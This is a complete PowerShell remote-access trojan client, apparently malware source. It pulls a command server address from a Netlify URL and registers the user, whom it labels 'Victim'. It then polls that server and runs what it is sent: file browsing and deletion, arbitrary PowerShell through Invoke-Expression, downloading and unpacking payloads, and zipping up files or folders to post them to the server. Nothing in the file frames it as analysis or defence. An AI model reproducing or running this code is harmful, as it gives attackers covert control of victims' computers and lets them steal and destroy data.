$global:TICK_RATE = 2
$global:LAST_TICK_TIME = 0
$global:username = [System.Environment]::UserName
$global:user_id = $null
$global:server_address = ""

$last_output = $null

function Get-Server-Addr {
    $res = Invoke-RestMethod -Uri 'https://astonishing-gecko-378b41.netlify.app'
    $global:server_address = $res -replace "`n","" -replace "`r",""
    Write-Host "Server address is: $global:server_address"
}

function Handle-Server {
    while ($true) {
        $client = New-Object System.Net.WebClient
        $client_json = @{
            "id" = $global:user_id
            "output" = $global:last_output
        } | ConvertTo-Json

        $client.Headers.Add('Content-Type', 'application/json')

        try {
            $response = Invoke-RestMethod -Uri $global:server_address -Method Post -Body $client_json -Headers @{"Content-Type" = "application/json"}
            $global:last_output = $null
            $json = $response

            if ($response.input -ne "") {
                $message = $json.input
                $message.trim()
                Write-Host "Input: $message"
                $message_commands = $message -split ' '
                switch ($message_commands[0]) {
                    "cd" {
                        try {
                            if ($message_commands.Length -ge 2) {
                                $newDirectory = $message_commands[1]

                                if(($message -split '"').Length -ge 2){
                                    $newDirectory = ($message -split '"')[1]
                                }elseif(($message -split "'").Length -ge 2){
                                        $newDirectory = ($message -split "'")[1]
                                }
                                
                        
                                if (Test-Path -Path $newDirectory -PathType Container) {
                                    Set-Location -Path $newDirectory
                                    $currentDirectory = (Get-Location).Path
                                    $global:last_output = "Directory changed to: $currentDirectory"
                                    Write-Host $global:last_output
                                } else {
                                    $global:last_output = "Directory '$newDirectory' does not exist."
                                    Write-Host $global:last_output
                                }
                            } else {
                                $global:last_output = "Usage: cd <directoryname>"
                                Write-Host $global:last_output
                            }
                        }
                        catch {
                            $global:last_output = "Error. Usage: cd <directoryname>"
                            Write-Host $global:last_output
                        }
                        
                        Break
                    }
                    "ls" {
                        try {
                            $all_items = Get-ChildItem (Get-Location).Path -Force
                            $global:last_output = $all_items -join '    '
                            Write-Host $global:last_output
                        }
                        catch {
                            $global:last_output = "Error. Usage: ls"
                            Write-Host $global:last_output
                        }

                        Break
                    }
                    "pwd" {
                        try {
                            $current_directory = (Get-Location).Path
                            $global:last_output = $current_directory
                            Write-Host $global:last_output
                        }
                        catch {
                            $global:last_output = "Error. Usage: pwd"
                            Write-Host $global:last_output
                        }
                        
                        Break
                    }
                    "mkdir" {
                        try {
                            if ($message_commands.Length -ge 2) {
                                $directory_name = $message_commands[1]

                                if(($message -split '"').Length -ge 2){
                                    $directory_name = ($message -split '"')[1]
                                }elseif(($message -split "'").Length -ge 2){
                                        $directory_name = ($message -split "'")[1]
                                }

                                $new_directory_path = Join-Path (Get-Location).Path $directory_name
                                if (-Not (Test-Path $new_directory_path)) {
                                    New-Item -ItemType Directory -Path $new_directory_path -Force | Out-Null 
                                    $global:last_output = "Directory '$directory_name' created successfully in the current path."
                                    Write-Host $global:last_output
                                } else {
                                    $global:last_output = "Directory '$directory_name' already exists in the current path."
                                    Write-Host $global:last_output
                                }
                            }else {
                                $global:last_output = "Usage: mkdir <directoryname>"
                                Write-Host $global:last_output
                            }
                        }catch{
                            $global:last_output = "Error. Usage: mkdir <directoryname>"
                            Write-Host $global:last_output
                        }

                        Break
                    }
                    "cat" {
                        try{
                            if ($message_commands.Length -ge 2) {
                                $file_name = $message_commands[1]

                                if(($message -split '"').Length -ge 2){
                                    $file_name = ($message -split '"')[1]
                                }elseif(($message -split "'").Length -ge 2){
                                    $file_name = ($message -split "'")[1]
                                }

                                $fileContent = Get-Content $file_name -Raw -Force
                                if ($null -ne $fileContent) {
                                    $global:last_output = $fileContent
                                    Write-Host $global:last_output
                                } else {
                                    $global:last_output = "File not found or cannot be read."
                                    Write-Host $global:last_output
                                }
                            } else {
                                $global:last_output = "Usage: cat <filename>"
                                Write-Host $global:last_output
                            }
                        }catch{
                            $global:last_output = "Error. Usage: cat <filename>"
                            Write-Host $global:last_output
                        }
                        

                        break
                    }
                    "rm" {
                        try {
                            if ($message_commands.Length -ge 2) {
                                $target = $message_commands[1]

                                if(($message -split '"').Length -ge 2){
                                    $target = ($message -split '"')[1]
                                }elseif(($message -split "'").Length -ge 2){
                                    $target = ($message -split "'")[1]
                                }
                                
                                if (Test-Path -Path $target) {
                                    if (Test-Path -Path $target -PathType Container) {
                                        Remove-Item -Path $target -Recurse -Force
                                        $global:last_output = "Directory '$target' and its contents have been removed."
                                    } else {
                                        Remove-Item -Path $target -Force
                                        $global:last_output = "File '$target' has been removed."
                                        Write-Host $global:last_output
                                    }
                                } else {
                                    $global:last_output = "File or directory '$target' not found."
                                    Write-Host $global:last_output
                                }
                            } else {
                                $global:last_output = "Usage: rm <filename or directory>"
                                Write-Host $global:last_output
                            }   
                        }
                        catch {
                            $global:last_output = "Error. Usage: rm <filename or directory>"
                            Write-Host $global:last_output
                        }

                        break
                    }
                    
                    "run_ps"{
                        try {
                            $global:last_output = Invoke-Expression $message.substring(7)
                            Write-Host $global:last_output 
                        }catch{
                            $global:last_output = "Error : ("
                        }
                    }
                    "upload_file"{
                        try{
                            $targetUrl = "$global:server_address/download"

                            $response = Invoke-RestMethod -Uri $targetUrl -Method Post -ContentType "application/json" -OutFile response.zip

                            $current_directory = (Get-Location).Path

                            Expand-Archive -Path ".\response.zip" -DestinationPath $current_directory -Force

                            Remove-Item ".\response.zip" -Force

                            $global:last_output = "File uploaded successfully"
                            Write-Host $global:last_output
                        }catch {
                            $global:last_output = "Error. Usage: upload_file <file or folder path>"
                            Write-Host $global:last_output
                        }
                        break
                    }
                    "get_file" {
                        try {
                            if ($message_commands.Length -ge 2) {
                                $sourcePath = $message_commands[1]

                                if(($message -split '"').Length -ge 2){
                                    $sourcePath = ($message -split '"')[1]
                                }elseif(($message -split "'").Length -ge 2){
                                    $sourcePath = ($message -split "'")[1]
                                }

                                if (Test-Path -Path $sourcePath) {
                                    if (Test-Path -PathType Leaf -Path $sourcePath) {
                                        # Sending a single file
                                        $tempDirectory = [System.IO.Path]::GetTempPath()
                                        $tempFileName = [System.IO.Path]::GetRandomFileName()
                                        $zipPath = Join-Path -Path $tempDirectory -ChildPath "$tempFileName.zip"
                                        
                                        Compress-Archive -Path $sourcePath -DestinationPath $zipPath
                                        
                                        $targetUrl = "$global:server_address/upload"
                                        
                                        try {
                                            $response = Invoke-RestMethod -Uri $targetUrl -Method Post -InFile $zipPath
                                            $global:last_output = $response
                                            Write-Host $global:last_output
                                        }
                                        catch {
                                            $global:last_output = "Error sending file: $_"
                                            Write-Host $global:last_output
                                        }
                                        
                                        Remove-Item -Path $zipPath -Force
                                        $global:last_output += "`r`nFile '$sourcePath' has been uploaded and removed."
                                        Write-Host $global:last_output
                                    } elseif (Test-Path -PathType Container -Path $sourcePath) {
                                        # Sending a folder
                                        $tempDirectory = [System.IO.Path]::GetTempPath()
                                        $tempFileName = [System.IO.Path]::GetRandomFileName()
                                        $zipPath = Join-Path -Path $tempDirectory -ChildPath "$tempFileName.zip"

                                        Compress-Archive -Path $sourcePath -DestinationPath $zipPath -Force

                                        $targetUrl = "$global:server_address/upload"

                                        try {
                                            $response = Invoke-RestMethod -Uri $targetUrl -Method Post -InFile $zipPath
                                            $global:last_output = $response
                                            Write-Host $global:last_output
                                        }
                                        catch {
                                            $global:last_output = "Error sending folder: $_"
                                            Write-Host $global:last_output
                                        }

                                        Remove-Item -Path $zipPath -Force
                                        $last_output += "`r`nFolder '$sourcePath' has been uploaded and removed."
                                    } else {
                                        $global:last_output = "Invalid source path: '$sourcePath'."
                                        Write-Host $global:last_output
                                    }
                                } else {
                                    $global:last_output = "Source path $sourcePath not found."
                                    Write-Host $global:last_output
                                }
                            } else {
                                $global:last_output = "Usage: get_file <file or folder path>"
                                Write-Host $global:last_output
                            }
                        }
                        catch {
                            $global:last_output = "Error. Usage: get_file <file or folder path>"
                            Write-Host $global:last_output
                        }
                        break
                    }
                    
                    Default {
                        $global:last_output = "Wrong command!"
                        Write-Host $global:last_output
                    }
                }
            }

            

            $time = [int][double]::Parse((Get-Date -UFormat %s))
            $global:LAST_TICK_TIME = $time
        } catch {
            Write-Host "Connection error"
        }

        
        $time = [int][double]::Parse((Get-Date -UFormat %s))

        if (($time - $global:LAST_TICK_TIME) -ge 10) {
            Write-Host "Can't connect to server! retrying in 10s"
            Start-Sleep -Seconds 10
            break
        } else {
            Start-Sleep -Seconds (1 / $TICK_RATE)
        }

        Start-Sleep -Seconds (1 / $TICK_RATE)
    }

    Main
}

function Generate-Client {
    try {
        $client = New-Object System.Net.WebClient
        $json = @{
            "username" = $username
        } | ConvertTo-Json

        $client.Headers.Add('Content-Type', 'application/json')

        $res = Invoke-RestMethod -Uri "$global:server_address/generate" -Method Post -Body $JSON -ContentType "application/json"

        if ($res -ne $null) {
            $global:user_id = $res.id
            Write-Host "Client generated! ID: $user_id"
            $global:LAST_TICK_TIME = [int](Get-Date -UFormat %s -Millisecond 0)
        } else {
            Write-Host "Couldn't generate client! retrying in 10s"
            Start-Sleep -Seconds 10
            Main
        }
    } catch {
        Write-Host "Couldn't generate client because of connection error! retrying in 10s"
        Start-Sleep -Seconds 10
        Main
    }
}

function Main {
    $global:last_output = $null
    Write-Host "Victim is $username"
    Get-Server-Addr
    Generate-Client
    Handle-Server
}

Main
